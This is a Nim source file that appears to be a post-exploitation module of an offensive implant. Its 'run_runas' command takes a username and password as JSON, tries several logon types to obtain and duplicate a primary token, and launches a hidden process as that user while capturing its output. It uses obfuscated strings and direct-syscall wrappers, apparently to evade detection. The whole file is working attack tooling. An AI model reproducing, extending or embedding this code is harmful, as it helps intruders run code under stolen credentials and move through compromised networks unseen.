import std/json
from std/strutils import strip
import ../utils/global
import ../utils/general/strings
import execution/core
from ../utils/winapi/handlers import
  createProcessWithLogonW, createProcessWithTokenW, createProcessAsUserW, createPipe,
  setHandleInformation, getStdHandle, closeHandle, getFileAttributesW, getLastError,
  logonUserW, duplicateTokenEx, createEnvironmentBlock, destroyEnvironmentBlock,
  loadUserProfileW, unloadUserProfile
from ../utils/winapi/syscall import readFile, waitForObject, ntCloseHandle, duplicateToken
from ../utils/winapi/utils import SECURITY_ATTRIBUTES

const
  createNoWindow = 0x08000000'u32
  createUnicodeEnvironment = 0x00000400'u32
  startfUseStdHandles = 0x100'u32
  handleFlagInherit = 1'u32
  stdInputHandle = 0xFFFFFFF6'u32
  invalidFileAttributes = 0xFFFFFFFF'u32
  maxCmdLen = 4096
  logonProviderDefault = 0'u32
  logonWithProfile = 1'u32
  tokenAllAccess = 0xF01FF'u32
  tokenPrimary = 1'u32
  securityImpersonation = 2'u32

type
  ProcessInfo = object
    hProcess*, hThread*: pointer
    dwProcessId*, dwThreadId*: uint32
  StartupInfoW = object
    cb: culong
    reserved, desktop, title: pointer
    x, y, xSize, ySize, xCountChars, yCountChars, fillAttribute, flags: culong
    showWindow: uint16
    cbReserved2: uint16
    lpReserved2: pointer
    hStdInput, hStdOutput, hStdError: pointer
  ProfileInfoW = object
    dwSize, dwFlags: culong
    userName, path, defaultPath, serverName, profilePath: pointer
    hProfile: pointer

proc jsonField(params, key: string): string =
  # Reads a string field from the params json
  try:
    let p = parseJson(params)
    if p.hasKey(key): p[key].getStr().strip(chars = {'"', '\''}) else: ""
  except JsonParsingError:
    ""

proc pathExists(path: string): bool =
  # Checks that the path exists on disk
  if path.len == 0: return false
  var w: array[520, uint16]
  asciiWide(path, w)
  getFileAttributesW(addr w[0]) != invalidFileAttributes

proc duplicatePrimary(src: pointer; hOut: ptr pointer): bool =
  # Duplicates a token as a primary token
  hOut[] = nil
  if src == nil:
    return false
  var sa = SECURITY_ATTRIBUTES(
    nLength: culong sizeof(SECURITY_ATTRIBUTES),
    lpSecurityDescriptor: nil,
    bInheritHandle: 0,
  )
  if duplicateTokenEx(
      src, tokenAllAccess, addr sa, securityImpersonation, tokenPrimary, hOut) != 0:
    return true
  duplicateToken(src, tokenAllAccess, nil, 0, tokenPrimary, hOut) == 0

proc logonPrimaryToken(
    userW, domainW, passW: openArray[uint16]; hOut: ptr pointer): bool =
  # Logs on the user and returns a primary token
  const logonTypes: array[5, culong] = [5, 4, 8, 3, 2]
  for lt in logonTypes:
    var logon: pointer = nil
    if logonUserW(
        addr userW[0], addr domainW[0], addr passW[0],
        lt, logonProviderDefault, addr logon) == 0:
      continue
    if duplicatePrimary(logon, hOut):
      discard ntCloseHandle(logon)
      return true
    discard ntCloseHandle(logon)
  false

proc spawnWithLogonW(
    userW, domainW, passW, appW: openArray[uint16]; cmdPtr: pointer;
    curDir: pointer; si: var StartupInfoW; pi: var ProcessInfo): bool =
  # Starts a process using logon credentials
  createProcessWithLogonW(
    addr userW[0], addr domainW[0], addr passW[0], logonWithProfile,
    addr appW[0], cmdPtr, createNoWindow, nil, curDir, addr si, addr pi) != 0

proc spawnWithPrimaryToken(
    hPrimary: pointer; userW: openArray[uint16]; cmdPtr, curDir: pointer;
    si: var StartupInfoW; pi: var ProcessInfo): bool =
  # Starts a process using a primary token and a loaded profile
  var profile: ProfileInfoW
  zeroMem(addr profile, sizeof(profile))
  profile.dwSize = culong sizeof(ProfileInfoW)
  profile.userName = addr userW[0]
  discard loadUserProfileW(hPrimary, addr profile)
  var envBlock: pointer = nil
  var flags = createNoWindow
  if createEnvironmentBlock(addr envBlock, hPrimary, 0) == 0:
    if createEnvironmentBlock(addr envBlock, hPrimary, 1) != 0:
      flags = flags or createUnicodeEnvironment
  else:
    flags = flags or createUnicodeEnvironment
  var ok = createProcessWithTokenW(
      hPrimary, logonWithProfile, nil, cmdPtr, flags, envBlock, curDir, addr si,
      addr pi) != 0
  if not ok:
    ok = createProcessAsUserW(
        hPrimary, nil, cmdPtr, nil, nil, 1,
        flags, envBlock, curDir, addr si, addr pi) != 0
  if envBlock != nil:
    discard destroyEnvironmentBlock(envBlock)
  if profile.hProfile != nil:
    discard unloadUserProfile(hPrimary, profile.hProfile)
  ok

proc run_runas*(params: string; buf: var openArray[char]): int =
  # Main function that runs a process as another user
  let domain = jsonField(params, obf("domain"))
  let user = jsonField(params, obf("user"))
  let password = jsonField(params, obf("pass"))
  let appPath = jsonField(params, obf("path"))
  let extra = jsonField(params, obf("args"))
  if user.len == 0:
    return writeErr(obf("missing --user"), buf)
  if password.len == 0:
    return writeErr(obf("missing --pass"), buf)
  if appPath.len == 0:
    return writeErr(obf("missing --path"), buf)
  if not pathExists(appPath):
    return writeErr(obf("path not found"), buf)

  let tail = extra.strip()
  var cmdLine = "\"" & appPath & "\""
  if tail.len > 0:
    cmdLine &= " " & tail
  if cmdLine.len >= maxCmdLen:
    return writeErr(obf("command line too long"), buf)

  var hRead, hWrite: pointer
  var sa = SECURITY_ATTRIBUTES(
    nLength: culong sizeof(SECURITY_ATTRIBUTES), lpSecurityDescriptor: nil, bInheritHandle: 1)
  if createPipe(addr hRead, addr hWrite, addr sa, 1024 * 1024) == 0:
    return writeErr(obf("CreatePipe failed"), buf)
  if setHandleInformation(hRead, handleFlagInherit, 0) == 0:
    discard closeHandle(hWrite)
    discard closeHandle(hRead)
    return writeErr(obf("SetHandleInformation failed"), buf)

  var userW: array[256, uint16]
  var domainW: array[256, uint16]
  var passW: array[512, uint16]
  var appW: array[520, uint16]
  var cmdW: array[maxCmdLen, uint16]
  asciiWide(user, userW)
  asciiWide(if domain.len > 0: domain else: ".", domainW)
  asciiWide(password, passW)
  asciiWide(appPath, appW)
  asciiWide(cmdLine, cmdW)
  let cmdPtr = addr cmdW[0]
  var sysDirW: array[128, uint16]
  asciiWide(obf("C:\\Windows\\System32"), sysDirW)
  let spawnDir = addr sysDirW[0]

  var si: StartupInfoW
  zeroMem(addr si, sizeof(si))
  si.cb = culong sizeof(StartupInfoW)
  si.flags = startfUseStdHandles
  si.hStdInput = getStdHandle(stdInputHandle)
  si.hStdOutput = hWrite
  si.hStdError = hWrite
  var pi: ProcessInfo
  zeroMem(addr pi, sizeof(pi))

  var spawned = false
  var hPrimary: pointer = nil
  if logonPrimaryToken(userW, domainW, passW, addr hPrimary):
    spawned = spawnWithPrimaryToken(hPrimary, userW, cmdPtr, spawnDir, si, pi)
    discard ntCloseHandle(hPrimary)
  if not spawned:
    spawned = spawnWithLogonW(userW, domainW, passW, appW, cmdPtr, spawnDir, si, pi)
  if not spawned:
    let gle = getLastError()
    discard closeHandle(hWrite)
    discard closeHandle(hRead)
    return writeErr(obf("runas failed gle=") & $gle, buf)

  discard closeHandle(hWrite)
  discard waitForObject(pi.hProcess)
  var pos = 0
  var chunk: array[4096, byte]
  while pos < buf.len:
    let rd = readFile(hRead, addr chunk[0], culong(min(chunk.len, buf.len - pos)))
    if rd == 0: break
    copyMem(addr buf[pos], addr chunk[0], int(rd))
    pos += int(rd)
  discard ntCloseHandle(pi.hThread)
  discard ntCloseHandle(pi.hProcess)
  discard closeHandle(hRead)
  if pos > 0: pos
  else: writeMsg(obf("Process finished (PID ") & $pi.dwProcessId & obf("), no output."), buf)
